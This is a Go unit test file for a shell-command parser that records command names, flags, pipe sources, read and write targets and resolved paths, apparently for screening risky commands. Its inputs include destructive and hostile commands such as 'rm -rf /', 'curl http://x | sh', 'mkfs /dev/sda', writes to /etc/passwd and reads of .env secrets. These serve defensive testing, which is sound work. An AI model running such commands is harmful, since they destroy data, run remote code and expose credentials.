package shell

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
)

func find(t *testing.T, res Result, name string) Command {
	t.Helper()
	for _, c := range res.Commands {
		if c.Name == name {
			return c
		}
	}
	t.Fatalf("command %q not found in %+v", name, res.Commands)
	return Command{}
}

func TestFlattenSimple(t *testing.T) {
	res := Flatten("rm -rf /", "/work")
	if !res.ParseOK {
		t.Fatal("parse failed")
	}
	c := find(t, res, "rm")
	if !slices.Equal(c.Args, []string{"-rf", "/"}) {
		t.Errorf("args = %v", c.Args)
	}
	if !slices.Contains(c.Flags, "r") || !slices.Contains(c.Flags, "f") {
		t.Errorf("flags = %v", c.Flags)
	}
}

func TestFlattenLongFlags(t *testing.T) {
	c := find(t, Flatten("rm --recursive --force x", "/work"), "rm")
	if !slices.Contains(c.Flags, "recursive") || !slices.Contains(c.Flags, "force") {
		t.Errorf("flags = %v", c.Flags)
	}
}

func TestFlattenChainsAndPipes(t *testing.T) {
	res := Flatten("echo hi && curl http://x | sh; ls", "/work")
	sh := find(t, res, "sh")
	if !sh.InPipe {
		t.Error("sh should be in a pipe")
	}
	if !slices.Contains(sh.PipeFrom, "curl") {
		t.Errorf("pipe_from = %v", sh.PipeFrom)
	}
	find(t, res, "echo")
	find(t, res, "ls")
}

func TestFlattenUpstreamWholePipe(t *testing.T) {
	// curl | base64 -d | sh must expose curl in sh's pipe_from.
	sh := find(t, Flatten("curl http://x | base64 -d | sh", "/w"), "sh")
	if !slices.Contains(sh.PipeFrom, "curl") || !slices.Contains(sh.PipeFrom, "base64") {
		t.Errorf("pipe_from = %v", sh.PipeFrom)
	}
}

func TestFlattenSubstitutionsAndSubshell(t *testing.T) {
	res := Flatten("echo $(rm -rf /tmp/x) ; (mkfs /dev/sda)", "/w")
	find(t, res, "rm")
	find(t, res, "mkfs")
}

func TestFlattenFuncBody(t *testing.T) {
	res := Flatten("f() { rm -rf /; }\nf", "/w")
	find(t, res, "rm")
}

func TestFlattenRedirectsAndWrites(t *testing.T) {
	c := find(t, Flatten("echo pwned > /etc/hosts", "/w"), "echo")
	if len(c.Redirects) != 1 || c.Redirects[0].Op != ">" || c.Redirects[0].Target != "/etc/hosts" {
		t.Fatalf("redirects = %+v", c.Redirects)
	}
	if !slices.Contains(c.WritesTo, "/etc/hosts") {
		t.Errorf("writes_to = %v", c.WritesTo)
	}
}

func TestFlattenWriteCommands(t *testing.T) {
	c := find(t, Flatten("cat x | tee /etc/passwd", "/w"), "tee")
	if !slices.Contains(c.WritesTo, "/etc/passwd") {
		t.Errorf("tee writes_to = %v", c.WritesTo)
	}
	c = find(t, Flatten("dd if=/dev/zero of=/etc/hosts", "/w"), "dd")
	if !slices.Contains(c.WritesTo, "/etc/hosts") || !slices.Contains(c.ReadsFrom, "/dev/zero") {
		t.Errorf("dd writes=%v reads=%v", c.WritesTo, c.ReadsFrom)
	}
	c = find(t, Flatten("cp secret.txt /etc/target", "/w"), "cp")
	if !slices.Contains(c.WritesTo, "/etc/target") || !slices.Contains(c.ReadsFrom, "/w/secret.txt") {
		t.Errorf("cp writes=%v reads=%v", c.WritesTo, c.ReadsFrom)
	}
	c = find(t, Flatten("sed -i 's/a/b/' /etc/hosts", "/w"), "sed")
	if !slices.Contains(c.WritesTo, "/etc/hosts") {
		t.Errorf("sed -i writes_to = %v", c.WritesTo)
	}
}

func TestFlattenReads(t *testing.T) {
	c := find(t, Flatten("cat .env", "/proj"), "cat")
	if !slices.Contains(c.ReadsFrom, "/proj/.env") {
		t.Errorf("reads_from = %v", c.ReadsFrom)
	}
	c = find(t, Flatten("grep -r AWS_SECRET .env", "/proj"), "grep")
	if !slices.Contains(c.ReadsFrom, "/proj/.env") {
		t.Errorf("grep reads_from = %v", c.ReadsFrom)
	}
}

func TestFlattenUnknownExpansion(t *testing.T) {
	res := Flatten("X=rm; $X -rf /", "/w")
	var unknown bool
	for _, c := range res.Commands {
		if c.HasUnknown && c.Name == "" {
			unknown = true
		}
	}
	if !unknown {
		t.Errorf("expected an unresolved command, got %+v", res.Commands)
	}
	c := find(t, Flatten(`rm -rf "$HOME/x"`, "/w"), "rm")
	if !c.HasUnknown {
		t.Error("expected has_unknown for $HOME expansion")
	}
}

func TestFlattenNameNormalization(t *testing.T) {
	find(t, Flatten("/bin/rm -rf /x", "/w"), "rm")
	find(t, Flatten(`\rm -rf /x`, "/w"), "rm")
	// wrappers expose the inner command too
	find(t, Flatten("command rm -rf /x", "/w"), "rm")
	find(t, Flatten("sudo -u root rm -rf /x", "/w"), "rm")
	find(t, Flatten("env FOO=1 rm -rf /x", "/w"), "rm")
	find(t, Flatten("timeout 5 rm -rf /x", "/w"), "rm")
	c := find(t, Flatten("find . -name '*~' | xargs rm -f", "/w"), "rm")
	if !slices.Contains(c.Flags, "f") {
		t.Errorf("xargs-unwrapped rm flags = %v", c.Flags)
	}
}

func TestFlattenParseError(t *testing.T) {
	res := Flatten("if then fi ((", "/w")
	if res.ParseOK {
		t.Error("expected parse failure")
	}
}

func TestFlattenPipeFromSubshell(t *testing.T) {
	// A subshell on the left of a pipe must still expose its inner command
	// names in the downstream element's pipe_from.
	sh := find(t, Flatten("(curl http://x) | sh", "/w"), "sh")
	if !sh.InPipe {
		t.Fatal("sh should be in a pipe")
	}
	if !slices.Contains(sh.PipeFrom, "curl") {
		t.Errorf("pipe_from = %v, want curl", sh.PipeFrom)
	}
}

func TestFlattenPipeFromChainedSubshell(t *testing.T) {
	sh := find(t, Flatten("(wget -qO- http://x && echo done) | bash", "/w"), "bash")
	if !slices.Contains(sh.PipeFrom, "wget") {
		t.Errorf("pipe_from = %v, want wget", sh.PipeFrom)
	}
}

func TestFlattenCdChangesWriteTarget(t *testing.T) {
	c := find(t, Flatten("cd /etc && echo pwned > hosts", "/proj"), "echo")
	if !slices.Contains(c.WritesTo, "/etc/hosts") {
		t.Errorf("writes_to = %v, want /etc/hosts", c.WritesTo)
	}
}

func TestFlattenCdSemicolonAndReads(t *testing.T) {
	c := find(t, Flatten("cd /srv/secret; cat config", "/proj"), "cat")
	if !slices.Contains(c.ReadsFrom, "/srv/secret/config") {
		t.Errorf("reads_from = %v, want /srv/secret/config", c.ReadsFrom)
	}
}

func TestFlattenCdRelativeAndParent(t *testing.T) {
	c := find(t, Flatten("cd sub && cd .. && echo x > out.txt", "/proj"), "echo")
	if !slices.Contains(c.WritesTo, "/proj/out.txt") {
		t.Errorf("writes_to = %v, want /proj/out.txt", c.WritesTo)
	}
}

func TestFlattenCdSubshellDoesNotLeak(t *testing.T) {
	// cd inside a subshell must not change the outer directory.
	res := Flatten("(cd /etc); echo x > out.txt", "/proj")
	c := find(t, res, "echo")
	if !slices.Contains(c.WritesTo, "/proj/out.txt") {
		t.Errorf("writes_to = %v, want /proj/out.txt (subshell cd must not leak)", c.WritesTo)
	}
}

func TestFlattenCdUnknownKeepsCwd(t *testing.T) {
	// cd into an unresolved variable cannot move the base directory.
	c := find(t, Flatten("cd $SOMEWHERE_X9 && echo x > out.txt", "/proj"), "echo")
	if !slices.Contains(c.WritesTo, "/proj/out.txt") {
		t.Errorf("writes_to = %v, want /proj/out.txt", c.WritesTo)
	}
}

func TestFlattenWritesResolveSymlink(t *testing.T) {
	dir := t.TempDir()
	// On some platforms (e.g. macOS /var -> /private/var) TempDir itself is
	// under a symlink; resolve it so the expected paths are canonical and do
	// not pick up an unrelated resolution.
	if resolved, err := filepath.EvalSymlinks(dir); err == nil {
		dir = resolved
	}
	real := filepath.Join(dir, "real.txt")
	if err := os.WriteFile(real, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link.txt")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	c := find(t, Flatten("echo x > "+link, dir), "echo")
	if !slices.Contains(c.WritesTo, link) || !slices.Contains(c.WritesTo, real) {
		t.Errorf("writes_to = %v, want both %s and %s", c.WritesTo, link, real)
	}
}

func TestFlattenControlFlowBodies(t *testing.T) {
	res := Flatten("if true; then rm -rf /; fi\nfor f in a b; do shred $f; done\nwhile true; do dd if=/a of=/b; done", "/w")
	find(t, res, "rm")
	find(t, res, "shred")
	find(t, res, "dd")
}

func TestFlattenArgPaths(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		cwd      string
		cmdName  string
		wantArgs []string
	}{
		{
			name:     "positional args become paths",
			cmd:      "git commit README.md src/main.go",
			cwd:      "/proj",
			cmdName:  "git",
			wantArgs: []string{"/proj/README.md", "/proj/src/main.go"},
		},
		{
			name:     "absolute path preserved",
			cmd:      "cat /etc/passwd",
			cwd:      "/proj",
			cmdName:  "cat",
			wantArgs: []string{"/etc/passwd"},
		},
		{
			name:     "long flag with value",
			cmd:      "openssl enc --in=/proj/.env --out=/tmp/out",
			cwd:      "/proj",
			cmdName:  "openssl",
			wantArgs: []string{"/proj/.env", "/tmp/out"},
		},
		{
			name:     "short flag with value skipped",
			cmd:      "rm -rf /tmp/x",
			cwd:      "/proj",
			cmdName:  "rm",
			wantArgs: []string{"/tmp/x"},
		},
		{
			name:     "mixed args and flags",
			cmd:      "cp --backup=numbered src.txt /dst/",
			cwd:      "/proj",
			cmdName:  "cp",
			wantArgs: []string{"/proj/numbered", "/proj/src.txt", "/dst"}, // numbered comes from --backup=numbered
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			c := find(t, Flatten(tc.cmd, tc.cwd), tc.cmdName)
			for _, want := range tc.wantArgs {
				if !slices.Contains(c.ArgPaths, want) {
					t.Errorf("ArgPaths = %v, want to contain %s", c.ArgPaths, want)
				}
			}
		})
	}
}

func TestFlattenArgPathsExcludesUnknown(t *testing.T) {
	// Arguments with unresolved expansions should not appear in ArgPaths
	res := Flatten(`cat "$HOME/.bashrc"`, "/proj")
	c := find(t, res, "cat")
	// The path contains $HOME which is unknown, so it should not be in ArgPaths
	// (but Args will still have it)
	if len(c.ArgPaths) != 0 {
		t.Errorf("ArgPaths = %v, want empty (unknown expansion)", c.ArgPaths)
	}
}

func TestFlattenArgPathsWithResolved(t *testing.T) {
	// ArgPaths should include symlink-resolved paths like WritesTo/ReadsFrom
	// This test creates a symlink and verifies both the symlink and target are included
	dir := t.TempDir()
	// On macOS, /var is a symlink to /private/var, so we need to resolve the dir itself
	if resolved, err := filepath.EvalSymlinks(dir); err == nil {
		dir = resolved
	}
	target := filepath.Join(dir, "target.txt")
	if err := os.WriteFile(target, []byte("test"), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link.txt")
	if err := os.Symlink(target, link); err != nil {
		t.Skip("symlink not supported")
	}

	c := find(t, Flatten("cat "+link, dir), "cat")
	// Should contain both the symlink and the resolved target
	if !slices.Contains(c.ArgPaths, link) {
		t.Errorf("ArgPaths = %v, want to contain symlink %s", c.ArgPaths, link)
	}
	if !slices.Contains(c.ArgPaths, target) {
		t.Errorf("ArgPaths = %v, want to contain resolved %s", c.ArgPaths, target)
	}
}
